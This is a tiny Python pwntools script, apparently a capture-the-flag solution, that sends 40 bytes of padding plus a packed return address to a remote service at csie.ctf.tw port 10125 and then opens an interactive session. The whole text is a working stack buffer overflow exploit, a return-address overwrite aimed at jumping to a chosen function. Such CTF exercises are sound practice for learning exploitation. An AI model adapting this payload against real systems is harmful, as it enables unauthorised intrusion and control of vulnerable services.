from pwn import *
pay = 'A'*40 + p64(0x0000000400686)
r = remote('csie.ctf.tw',10125)
r.send(pay)
r.interactive()
